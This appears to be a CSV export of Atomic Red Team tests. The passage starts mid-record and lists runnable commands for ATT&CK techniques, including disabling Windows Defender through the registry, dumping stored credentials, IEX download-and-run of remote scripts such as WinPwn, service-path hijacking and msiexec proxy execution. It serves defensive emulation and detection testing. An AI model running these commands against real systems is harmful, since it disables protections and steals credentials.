reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" /v ""DisallowExploitProtectionOverride"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection""  /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\software\microsoft\windows defender\spynet"" /v ""SubmitSamplesConsent"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Microsoft\Windows Defender"" /v ""PUAProtection"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
",command_prompt,True,,"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableBehaviorMonitoring"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIntrusionPreventionSystem"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIOAVProtection"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableOnAccessProtection"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRoutinelyTakingAction"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScriptScanning"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v ""DisableEnhancedNotifications"" /t REG_DWORD /d ""0"" /f >NUL 2>nul 
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""DisableBlockAtFirstSeen"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SpynetReporting"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"" /v ""MpEnablePus"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" /v ""DisallowExploitProtectionOverride"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Microsoft\Windows Defender\Features"" /v ""TamperProtection""  /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\software\microsoft\windows defender\spynet"" /v ""SubmitSamplesConsent"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Microsoft\Windows Defender"" /v ""PUAProtection"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender Registry - Powershell,a72cfef8-d252-48b3-b292-635d332625c3,"Disable Windows Defender by tampering with windows defender registry through powershell
",windows,,,"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiSpyware"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiVirus"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableBehaviorMonitoring"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIntrusionPreventionSystem"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIOAVProtection"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableOnAccessProtection"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRealtimeMonitoring"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRoutinelyTakingAction"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableScanOnRealtimeEnable"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableScriptScanning"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting"" -Name ""DisableEnhancedNotifications"" -Value 1  
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"" -Name ""DisableBlockAtFirstSeen"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"" -Name ""SpynetReporting"" -Value 0 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine"" -Name ""MpEnablePus"" -Value 0 
Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" -Name ""DisallowExploitProtectionOverride"" -Value 0 
Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"" -Name ""TamperProtection""  -Value 0 
Set-ItemProperty ""HKLM:\software\microsoft\windows defender\spynet"" -Name ""SubmitSamplesConsent"" -Value 0 
Set-ItemProperty ""HKLM:\Software\Microsoft\Windows Defender"" -Name ""PUAProtection"" -Value 0 
",powershell,True,,"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiSpyware"" -Value 0 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiVirus"" -Value 0
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableBehaviorMonitoring"" -Value 0 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIntrusionPreventionSystem"" -Value 0
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIOAVProtection"" -Value 0 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableOnAccessProtection"" -Value 0 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRealtimeMonitoring"" -Value 0 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRoutinelyTakingAction"" -Value 0 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableScanOnRealtimeEnable"" -Value 0 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableScriptScanning"" -Value 0 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting"" -Name ""DisableEnhancedNotifications"" -Value 0  
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"" -Name ""DisableBlockAtFirstSeen"" -Value 0
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"" -Name ""SpynetReporting"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine"" -Name ""MpEnablePus"" -Value 1 
Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" -Name ""DisallowExploitProtectionOverride"" -Value 1 
Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"" -Name ""TamperProtection""  -Value 1
Set-ItemProperty ""HKLM:\software\microsoft\windows defender\spynet"" -Name ""SubmitSamplesConsent"" -Value 1 
Set-ItemProperty ""HKLM:\Software\Microsoft\Windows Defender"" -Name ""PUAProtection"" -Value 1 
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,ESXi - Disable Account Lockout Policy via PowerCLI,091a6290-cd29-41cb-81ea-b12f133c66cb,"An adversary may disable account lockout policy within ESXi to have the ability to prevent defensive actions from being enforced in the future or to prevent future alerting.
",linux,,,"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
Get-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false
Disconnect-VIServer -Confirm:$false
",powershell,True,,,powershell,"dependencies.0.description: Check if VMWARE PowerCLI PowerShell Module is installed.

dependencies.0.prereq_command: $RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable
if (-not $RequiredModule) {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name VMware.PowerCLI -Confirm:$false

","input_arguments.vm_host.description: Specify the host name of the ESXi Server

input_arguments.vm_host.type: string

input_arguments.vm_host.default: atomic.local

input_arguments.vm_user.description: Specify the privilege user account on ESXi Server

input_arguments.vm_user.type: string

input_arguments.vm_user.default: root

input_arguments.vm_pass.description: Specify the privilege user password on ESXi Server

input_arguments.vm_pass.type: string

input_arguments.vm_pass.default: pass

"
T1555,Credentials from Password Stores,Extract Windows Credential Manager via VBA,234f9b7c-b53d-4f32-897b-b880a6c9ea7b,"This module will extract the credentials found within the Windows credential manager and dump
them to $env:TEMP\windows-credentials.txt
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1555\src\T1555-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""
",powershell,,,"Remove-Item ""$env:TEMP\windows-credentials.txt"" -ErrorAction Ignore
",powershell,"dependencies.0.description: Microsoft Word must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""word.Application"" | Out-Null
  $process = ""winword""
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Word manually to meet this requirement""

",
T1555,Credentials from Password Stores,Dump credentials from Windows Credential Manager With PowerShell [windows Credentials],c89becbe-1758-4e7d-a0f4-97d2188a23e3,This module will extract the credentials from Windows Credential Manager,windows,,,"IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   
",powershell,False,,,,,
T1555,Credentials from Password Stores,Dump credentials from Windows Credential Manager With PowerShell [web Credentials],8fd5a296-6772-4766-9991-ff4e92af7240,This module will extract the credentials from Windows Credential Manager,windows,,,"IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force
",powershell,False,,,,,
T1555,Credentials from Password Stores,Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials],36753ded-e5c4-4eb5-bc3c-e8fba236878d,This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe,windows,,,"vaultcmd /listcreds:""Windows Credentials"" /all
",powershell,False,,,,,
T1555,Credentials from Password Stores,Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials],bc071188-459f-44d5-901a-f8f2625b2d2e,This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe,windows,,,"vaultcmd /listcreds:""Web Credentials"" /all
",powershell,False,,,,,
T1555,Credentials from Password Stores,WinPwn - Loot local Credentials - lazagne,079ee2e9-6f16-47ca-a635-14efcd994118,"The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. 
Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). 
This tool has been developed for the purpose of finding these passwords for the most commonly-used software",windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
lazagnemodule -consoleoutput -noninteractive",powershell,,,,,,
T1555,Credentials from Password Stores,WinPwn - Loot local Credentials - Wifi Credentials,afe369c2-b42e-447f-98a3-fb1f4e2b8552,Loot local Credentials - Wifi Credentials technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
wificreds -consoleoutput -noninteractive  ",powershell,,,,,,
T1555,Credentials from Password Stores,WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords,db965264-3117-4bad-b7b7-2523b7856b92,Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
decryptteamviewer -consoleoutput -noninteractive  ",powershell,,,,,,
T1574.009,Hijack Execution Flow: Path Interception by Unquoted Path,Execution of program.exe as service with unquoted service path,2770dea7-c50f-457b-84c4-c40a47460d9f,"When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability
known as Unquoted Service Path which allows a user to gain SYSTEM privileges.
In this case, if an executable program.exe in C:\ exists, C:\program.exe will be executed instead of test.exe in C:\Program Files\subfolder\test.exe.
",windows,,,"copy ""#{service_executable}"" ""C:\Program Files\windows_service.exe""
copy ""#{service_executable}"" ""C:\program.exe""
sc create ""Example Service"" binpath= ""C:\Program Files\windows_service.exe"" Displayname= ""Example Service"" start= auto
sc start ""Example Service""
",command_prompt,True,,"sc stop ""Example Service"" >nul 2>&1
sc delete ""Example Service"" >nul 2>&1
del ""C:\Program Files\windows_service.exe"" >nul 2>&1
del ""C:\program.exe"" >nul 2>&1
del ""C:\Time.log"" >nul 2>&1
",,,"input_arguments.service_executable.description: Path of the executable used for the service and as the hijacked program.exe

input_arguments.service_executable.type: path

input_arguments.service_executable.default: PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe

"
T1120,Peripheral Device Discovery,Win32_PnPEntity Hardware Inventory,2cb4dbf2-2dca-4597-8678-4d39d207a3a5,Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity,windows,,,"Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt
$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne """" } |Set-Content $env:TEMP\T1120_collection.txt",powershell,,,Remove-Item $env:TEMP\T1120_collection.txt -ErrorAction Ignore,,,
T1120,Peripheral Device Discovery,WinPwn - printercheck,cb6e76ca-861e-4a7f-be08-564caa3e6f75,Search for printers / potential vulns using printercheck function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
printercheck -noninteractive -consoleoutput",powershell,,,,,,
T1036.005,Masquerading: Match Legitimate Name or Location,Execute a process from a directory masquerading as the current parent directory.,812c3ab8-94b0-4698-a9bf-9420af23ce24,"Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)
",macos,linux,,"mkdir $HOME/...
cp $(which sh) $HOME/...
$HOME/.../sh -c ""echo #{test_message}""
",sh,False,,"rm -f $HOME/.../sh
rmdir $HOME/.../
",,,"input_arguments.test_message.description: Test message to echo out to the screen

input_arguments.test_message.type: string

input_arguments.test_message.default: Hello from the Atomic Red Team test T1036.005#1

"
T1036.005,Masquerading: Match Legitimate Name or Location,Masquerade as a built-in system executable,35eb8d16-9820-4423-a2a1-90c4f5edd9ca,"Launch an executable that attempts to masquerade as a legitimate executable.
",windows,,,"Add-Type -TypeDefinition @'
public class Test {
    public static void Main(string[] args) {
        System.Console.WriteLine(""tweet, tweet"");
    }
}
'@ -OutputAssembly ""#{executable_filepath}""

Start-Process -FilePath ""#{executable_filepath}""
",powershell,,,"Remove-Item -Path ""#{executable_filepath}"" -ErrorAction Ignore
",,,"input_arguments.executable_filepath.description: File path where the generated executable will be dropped and executed from. The filename should be the name of a built-in system utility.

input_arguments.executable_filepath.type: string

input_arguments.executable_filepath.default: $Env:windir\Temp\svchost.exe

"
T1553.003,Subvert Trust Controls: SIP and Trust Provider Hijacking,SIP (Subject Interface Package) Hijacking via Custom DLL,e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675,"Registers a DLL that logs signature checks, mimicking SIP hijacking. This test uses a DLL from 
https://github.com/gtworek/PSBits/tree/master/SIP and registers it using regsvr32, thereby causing
the system to utilize it during signature checks, and logging said checks.
",windows,,,"regsvr32.exe #{dll_payload}
",command_prompt,True,,"regsvr32.exe /u #{dll_payload}
",powershell,"dependencies.0.description: GTSIPProvider.dll must exist on disk at specified location (#{dll_payload})

dependencies.0.prereq_command: if (Test-Path ""#{dll_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll"" -OutFile ""#{dll_payload}""

","input_arguments.dll_payload.description: Path to GTSIPProvider.dll

input_arguments.dll_payload.type: path

input_arguments.dll_payload.default: PathToAtomicsFolder\T1553.003\bin\GTSIPProvider.dll

"
T1218.007,Signed Binary Proxy Execution: Msiexec,Msiexec.exe - Execute Local MSI file with embedded JScript,a059b6c4-e7d6-4b2e-bcd7-9b2b33191a04,"Executes an MSI containing embedded JScript code using msiexec.exe
",windows,,,"#{msi_exe} /q /#{action} ""#{msi_payload}""
",command_prompt,,,,powershell,"dependencies.0.description: The MSI file must exist on disk at specified location (#{msi_payload})

dependencies.0.prereq_command: if (Test-Path ""#{msi_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{msi_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"" -OutFile ""#{msi_payload}""

","input_arguments.msi_payload.description: MSI file to execute

input_arguments.msi_payload.type: path

input_arguments.msi_payload.default: PathToAtomicsFolder\T1218.007\bin\T1218.007_JScript.msi

input_arguments.msi_exe.description: MSIExec File Path

input_arguments.msi_exe.type: path

input_arguments.msi_exe.default: c:\windows\system32\msiexec.exe

input_arguments.action.description: Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.


input_arguments.action.type: string

input_arguments.action.default: i

"
T1218.007,Signed Binary Proxy Execution: Msiexec,Msiexec.exe - Execute Local MSI file with embedded VBScript,8d73c7b0-c2b1-4ac1-881a-4aa644f76064,"Executes an MSI containing embedded VBScript code using msiexec.exe
",windows,,,"#{msi_exe} /q /#{action} ""#{msi_payload}""
",command_prompt,,,,powershell,"dependencies.0.description: The MSI file must exist on disk at specified location (#{msi_payload})

dependencies.0.prereq_command: if (Test-Path ""#{msi_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{msi_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi"" -OutFile ""#{msi_payload}""

","input_arguments.msi_payload.description: MSI file to execute

input_arguments.msi_payload.type: path

input_arguments.msi_payload.default: PathToAtomicsFolder\T1218.007\bin\T1218.007_VBScript.msi

input_arguments.msi_exe.description: MSIExec File Path

input_arguments.msi_exe.type: path

input_arguments.msi_exe.default: c:\windows\system32\msiexec.exe

input_arguments.action.description: Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.


input_arguments.action.type: string

input_arguments.action.default: i

"
T1218.007,Signed Binary Proxy Execution: Msiexec,Msiexec.exe - Execute Local MSI file with an embedded DLL,628fa796-76c5-44c3-93aa-b9d8214fd568,"Executes an MSI containing an embedded DLL using msiexec.exe
",windows,,,"#{msi_exe} /q /#{action} ""#{msi_payload}""
",command_prompt,,,,powershell,"dependencies.0.description: The MSI file must exist on disk at specified location (#{msi_payload})

dependencies.0.prereq_command: if (Test-Path ""#{msi_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{msi_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi"" -OutFile ""#{msi_payload}""

","input_arguments.msi_payload.description: MSI file to execute

input_arguments.msi_payload.type: path

input_arguments.msi_payload.default: PathToAtomicsFolder\T1218.007\bin\T1218.007_DLL.msi

input_arguments.msi_exe.description: MSIExec File Path

input_arguments.msi_exe.type: path

input_arguments.msi_exe.default: c:\windows\system32\msiexec.exe

input_arguments.action.description: Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.


input_arguments.action.type: string

input_arguments.action.default: i

"
T1218.007,Signed Binary Proxy Execution: Msiexec,Msiexec.exe - Execute Local MSI file with an embedded EXE,ed3fa08a-ca18-4009-973e-03d13014d0e8,"Executes an MSI containing an embedded EXE using msiexec.exe
",windows,,,"#{msi_exe} /q /#{action} ""#{msi_payload}""
",command_prompt,,,,powershell,"dependencies.0.description: The MSI file must exist on disk at specified location (#{msi_payload})

dependencies.0.prereq_command: if (Test-Path ""#{msi_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{msi_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi"" -OutFile ""#{msi_payload}""

","input_arguments.msi_payload.description: MSI file to execute

input_arguments.msi_payload.type: path

input_arguments.msi_payload.default: PathToAtomicsFolder\T1218.007\bin\T1218.007_EXE.msi

input_arguments.msi_exe.description: MSIExec File Path

input_arguments.msi_exe.type: path

input_arguments.msi_exe.default: c:\windows\system32\msiexec.exe

input_arguments.action.description: Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.


input_arguments.action.type: string

input_arguments.action.default: i

"
T1218.007,Signed Binary Proxy Execution: Msiexec,WMI Win32_Product Class - Execute Local MSI file with embedded JScript,882082f0-27c6-4eec-a43c-9aa80bccdb30,"Executes an MSI containing embedded JScript code using the WMI Win32_Product class
",windows,,,"Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
",powershell,,,,powershell,"dependencies.0.description: The MSI file must exist on disk at specified location (#{msi_payload})

dependencies.0.prereq_command: if (Test-Path ""#{msi_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{msi_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"" -OutFile ""#{msi_payload}""

","input_arguments.msi_payload.description: MSI file to execute

input_arguments.msi_payload.type: path

input_arguments.msi_payload.default: PathToAtomicsFolder\T1218.007\bin\T1218.007_JScript.msi

input_arguments.action.description: Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.


input_arguments.action.type: string

input_arguments.action.default: Install

"
T1218.007,Signed Binary Proxy Execution: Msiexec,WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,cf470d9a-58e7-43e5-b0d2-805dffc05576,"Executes an MSI containing embedded VBScript code using the WMI Win32_Product class
",windows,,,"Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
",powershell,,,,powershell,"dependencies.0.description: The MSI file must exist on disk at specified location (#{msi_payload})

dependencies.0.prereq_command: if (Test-Path ""#{msi_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{msi_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi"" -OutFile ""#{msi_payload}""

","input_arguments.msi_payload.description: MSI file to execute

input_arguments.msi_payload.type: path

input_arguments.msi_payload.default: PathToAtomicsFolder\T1218.007\bin\T1218.007_VBScript.msi

input_arguments.action.description: Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.


input_arguments.action.type: string

input_arguments.action.default: Install

"
T1218.007,Signed Binary Proxy Execution: Msiexec,WMI Win32_Product Class - Execute Local MSI file with an embedded DLL,32eb3861-30da-4993-897a-42737152f5f8,"Executes an MSI containing an embedded DLL using the WMI Win32_Product class
",windows,,,"Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
",powershell,,,,powershell,"dependencies.0.description: The MSI file must exist on disk at specified location (#{msi_payload})

dependencies.0.prereq_command: if (Test-Path ""#{msi_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{msi_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi"" -OutFile ""#{msi_payload}""

","input_arguments.msi_payload.description: MSI file to execute

input_arguments.msi_payload.type: path

input_arguments.msi_payload.default: PathToAtomicsFolder\T1218.007\bin\T1218.007_DLL.msi

input_arguments.action.description: Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.


input_arguments.action.type: string

input_arguments.action.default: Install

"
T1218.007,Signed Binary Proxy Execution: Msiexec,WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,55080eb0-49ae-4f55-a440-4167b7974f79,"Executes an MSI containing an embedded EXE using the WMI Win32_Product class
",windows,,,"Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
",powershell,,,,powershell,"dependencies.0.description: The MSI file must exist on disk at specified location (#{msi_payload})

dependencies.0.prereq_command: if (Test-Path ""#{msi_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{msi_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi"" -OutFile ""#{msi_payload}""

","input_arguments.msi_payload.description: MSI file to execute

input_arguments.msi_payload.type: path

input_arguments.msi_payload.default: PathToAtomicsFolder\T1218.007\bin\T1218.007_EXE.msi

input_arguments.action.description: Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.


input_arguments.action.type: string

input_arguments.action.default: Install

"
T1218.007,Signed Binary Proxy Execution: Msiexec,Msiexec.exe - Execute the DllRegisterServer function of a DLL,0106ffa5-fab6-4c7d-82e3-e6b8867d5e5d,"Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the ""bin"" folder is only built for 64-bit, so this won't work on a 32-bit OS.
",windows,,,"#{msi_exe} /y ""#{dll_payload}""
",command_prompt,,,,powershell,"dependencies.0.description: The DLL must exist on disk at specified location (#{dll_payload})

dependencies.0.prereq_command: if (Test-Path ""#{dll_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile ""#{dll_payload}""

","input_arguments.dll_payload.description: DLL to execute that has an implemented DllRegisterServer function

input_arguments.dll_payload.type: path

input_arguments.dll_payload.default: PathToAtomicsFolder\T1218.007\bin\MSIRunner.dll

input_arguments.msi_exe.description: MSIExec File Path

input_arguments.msi_exe.type: path

input_arguments.msi_exe.default: c:\windows\system32\msiexec.exe

"
